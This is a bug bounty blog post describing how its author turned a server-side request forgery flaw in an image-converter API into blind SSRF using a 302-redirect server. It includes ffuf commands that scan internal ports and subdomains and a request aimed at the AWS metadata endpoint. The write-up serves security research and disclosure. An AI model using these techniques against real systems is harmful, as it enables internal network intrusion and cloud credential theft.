---
title: "From . in regex to SSRF - part 2"
date: 2020-01-14T10:14:47+01:00
draft: false
tags: [SSRF, bugbounty]
---

In this story I will continue my journey to exploit Server Side Request Forgery (SSRF). Part 1 is available [here]{{< ref "/blog/from-dot-in-regex-to-ssrf-part-1.md" >}}).

What is state of the game up to now? I have found service that is vulnerable to SSRF by executing the REST call and by passing domain name check:

```https://api.example.org/image-converter/https://www-example.org```

I have registered domain name: `www-example.org` and add for it `CNAME` record to my EC2 server.

But wait a second. **This is not yet "SSRF"**. For now I could call specific domain, but didn't prove ability to scan internal ports or execute requests to internal services.

First of all I checked what headers are sent to my server:

```nc -l -n -p 80```

![obraz](https://user-images.githubusercontent.com/17719543/139582215-1ead26ed-3b56-4ff7-9e25-35d901c27653.png)

What it interesting here is `User-Agent`. Clearly indicating **NodeJS** and **node-fetch** library.

## Tools

For this part I needed http server to host some files and do redirects. Here is my script based on python `http.server`:

{{< gist xvnpw 9fa7f7c5a7dfa13d3f27d2e19af9a264 >}}

This script is doing two things:

* if request is starting with query parameter `/?r=` it is taking value of this parameter and put it in `Location` header, returning code `302`
* else it is loading file from disk and always returning `image/svg+xml` with code `200`. **This is important!** Always return expected `Content-Type` to check if parser can handle different types.

This code is PoC so don't expect much out of it. It's for testing purpose only. `Don't use it on production`.

You can check more of my hacking resources in [my public repo](https://github.com/xvnpw/hacking).

## Mind map

Here is mind map of ideas that I had during exploitation:

![obraz](https://user-images.githubusercontent.com/17719543/139582537-5fe5ba0c-123f-4413-8a0f-9f90194a5415.png)

## SVG payload

Hosting some svg files was my first shot. I have took some from PayloadsAllTheThings repository, but sadly none was working.

In most cases I got `502 Bad Gateway` and in some payloads were just ignored. The other thing I noticed is that I was able request `png` or `jpg` file and it was parsed. I have gut feeling that service was using some kind of NodeJS library, not ImageMagick. Maybe I did miss something?

## HTTP Redirect

I have implemented in my `server.py` possibility to redirect with new `Location` header. This created variety of options to exploit.

Lets start with ports scanning:

```https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F127.0.0.1%3A80%2F```

Redirect part is url encoded to not break service with `?` or `/`. I have taken this to Burp Intruder and scan all ports. But if you are using free version of Burp this can take a very long time. So it's better to use `ffuf`:

```bash
for i in {1..65535}; do echo $i; done > all_ports.txt;
ffuf -mc all -ac -w all_ports.txt -u 'https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F127.0.0.1%3AFUZZ%2F'
```

Same way I was able to **scan for internal services**. For list of domains I used SecLists:
```bash
ffuf -mc all -ac -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u 'https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2FFUZZ.example.org%2F'
```

This will try to make a call to subdomains of `example.org` but from perspective of `api.example.org`. In my case it found redis instance on `redis.example.org`.

Next step for me was **access cloud resources**, e.g. metadata services on 169.254.169.254:

```https://api.example.org/image-converter/https://www-example.org/%3Fr%3Dhttp%3A%2F%2F169.254.169.254%3A80%2F```

I was able to positively connect to 169.254.169.254. So it means that service was running on AWS.

## Summary

I finally got blind SSRF using redirect `302` code and `Location` header! That's gave me possibility to penetrate internal network. I was disappointed that no svg payload was working. For part 3 I left "HTTP Parser Abuse" - I will try to force node-fetch to change protocol and talk with services like `redis`.

---

Thanks for reading! You can follow me on [Twitter](https://twitter.com/xvnpw).
